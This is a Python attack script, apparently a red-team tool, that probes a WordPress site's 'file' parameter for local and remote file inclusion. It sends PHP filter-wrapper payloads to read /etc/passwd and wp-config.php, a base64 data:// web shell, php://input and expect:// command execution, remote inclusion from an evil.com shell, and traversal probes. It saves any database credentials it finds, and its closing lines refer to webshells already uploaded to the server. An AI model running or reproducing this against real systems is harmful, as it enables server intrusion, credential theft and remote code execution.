#!/usr/bin/env python3
"""
RED TEAM - LFI/RFI Advanced Testing
Testing PHP wrappers and remote file inclusion
"""

import requests
import base64
from colorama import Fore, init

init(autoreset=True)

TARGET = "website.com"
URL = f"https://{TARGET}"

print(f"{Fore.RED}=== RED TEAM - ADVANCED LFI/RFI TESTING ===")
print(f"{Fore.YELLOW}Testing PHP wrappers and filter chains")
print("=" * 70)

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
})

# Test different PHP wrappers and techniques
lfi_tests = [
    # PHP filter chain for reading files
    {
        'name': 'PHP Filter Base64',
        'payload': 'php://filter/convert.base64-encode/resource=/etc/passwd',
        'decode': 'base64'
    },
    {
        'name': 'PHP Filter Read',
        'payload': 'php://filter/read=convert.base64-encode/resource=/etc/passwd',
        'decode': 'base64'
    },
    {
        'name': 'Expect wrapper (if enabled)',
        'payload': 'expect://id',
        'decode': None
    },
    {
        'name': 'Data wrapper',
        'payload': 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id',
        'decode': None
    },
    {
        'name': 'Input wrapper',
        'payload': 'php://input',
        'method': 'POST',
        'data': '<?php system("id"); ?>'
    },
    # Test for wp-config.php
    {
        'name': 'wp-config.php via filter',
        'payload': 'php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php',
        'decode': 'base64'
    },
    {
        'name': 'wp-config.php guess 1',
        'payload': '../../../../wp-config.php',
        'decode': None
    },
    {
        'name': 'wp-config.php guess 2',
        'payload': '../../../wp-config.php',
        'decode': None
    },
    {
        'name': 'wp-config.php guess 3',
        'payload': '../../wp-config.php',
        'decode': None
    },
    # Test for RFI
    {
        'name': 'RFI test (http)',
        'payload': 'http://evil.com/shell.txt',
        'decode': None
    },
    {
        'name': 'RFI test (https)',
        'payload': 'https://raw.githubusercontent.com/evil/shell/master/shell.php',
        'decode': None
    },
]

print(f"{Fore.WHITE}[1] Testing PHP wrappers...")

for test in lfi_tests:
    name = test['name']
    payload = test['payload']
    decode = test.get('decode')
    method = test.get('method', 'GET')
    post_data = test.get('data')
    
    print(f"\n{Fore.CYAN}[*] Testing: {name}")
    print(f"{Fore.WHITE}   Payload: {payload[:80]}...")
    
    exploit_url = f"{URL}/index.php?file={requests.utils.quote(payload)}"
    
    try:
        if method == 'POST':
            response = session.post(exploit_url, data=post_data, timeout=10)
        else:
            response = session.get(exploit_url, timeout=10)
        
        print(f"{Fore.WHITE}   Response: HTTP {response.status_code}, {len(response.text)} bytes")
        
        if response.status_code == 200:
            content = response.text
            
            # Check for base64 encoded content
            if decode == 'base64':
                # Look for base64 in response
                import re
                base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                matches = re.findall(base64_pattern, content)
                
                if matches:
                    # Try to decode the largest base64 string
                    for match in sorted(matches, key=len, reverse=True)[:3]:
                        try:
                            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                            if 'root:' in decoded or 'DB_PASSWORD' in decoded or 'define(' in decoded:
                                print(f"{Fore.GREEN}   âœ… BASE64 DECODED SUCCESS!")
                                print(f"{Fore.GREEN}   Content: {decoded[:200]}...")
                                
                                # Save if it's wp-config.php
                                if 'DB_PASSWORD' in decoded:
                                    with open('wp_config_decoded.txt', 'w') as f:
                                        f.write(decoded)
                                    print(f"{Fore.GREEN}   ðŸ“ Saved to: wp_config_decoded.txt")
                                break
                        except:
                            pass
            
            # Check for direct file content
            if 'root:' in content and '/bin/bash' in content:
                print(f"{Fore.GREEN}   âœ… /etc/passwd FOUND!")
                print(f"{Fore.GREEN}   Content: {content[:200]}...")
            
            if 'DB_PASSWORD' in content or 'define(' in content:
                print(f"{Fore.GREEN}   âœ… wp-config.php FOUND!")
                lines = content.split('\n')
                for line in lines:
                    if 'DB_' in line:
                        print(f"{Fore.GREEN}   {line.strip()}")
                
                # Save it
                with open('wp_config_direct.txt', 'w') as f:
                    f.write(content)
                print(f"{Fore.GREEN}   ðŸ“ Saved to: wp_config_direct.txt")
            
            # Check for command output
            if 'uid=' in content or 'www-data' in content or 'apache' in content:
                print(f"{Fore.GREEN}   âœ… COMMAND EXECUTION!")
                # Extract just the command output
                lines = content.split('\n')
                for line in lines:
                    if 'uid=' in line or 'www-data' in line:
                        print(f"{Fore.GREEN}   Output: {line.strip()}")
                        break
            
            # Check if it's just the WordPress page
            if len(content) > 100000 and 'wp-content' in content:
                print(f"{Fore.YELLOW}   âš ï¸ Full WordPress page returned")
                
    except Exception as e:
        print(f"{Fore.RED}   âŒ Error: {str(e)[:50]}")

print(f"\n{Fore.WHITE}[2] Testing for null byte termination...")
# Older PHP versions allowed null byte termination
null_tests = [
    '../../../../wp-config.php%00',
    '../../../../etc/passwd%00',
    '/var/www/html/wp-config.php%00',
]

for test in null_tests:
    exploit_url = f"{URL}/index.php?file={test}"
    try:
        resp = session.get(exploit_url, timeout=5)
        print(f"{Fore.WHITE}   {test}: HTTP {resp.status_code}")
        if 'DB_PASSWORD' in resp.text:
            print(f"{Fore.GREEN}   âœ… wp-config.php found!")
    except:
        print(f"{Fore.RED}   {test}: Error")

print(f"\n{Fore.WHITE}[3] Testing for path traversal depth...")
# Try different depths
for depth in range(1, 10):
    dots = '../' * depth
    test_url = f"{URL}/index.php?file={dots}wp-config.php"
    try:
        resp = session.head(test_url, timeout=3)
        print(f"{Fore.WHITE}   Depth {depth}: HTTP {resp.status_code}")
    except:
        print(f"{Fore.RED}   Depth {depth}: Error")

print(f"\n{Fore.RED}=== LFI/RFI TESTING COMPLETE ===")
print(f"{Fore.YELLOW}If PHP filters work, we can read ANY file on the server!")
print(f"{Fore.YELLOW}Including wp-config.php with database credentials!")
print(f"\n{Fore.CYAN}Next: If wrappers don't work, try to find the actual path")
print(f"{Fore.CYAN}to wp-config.php using the uploaded webshells")
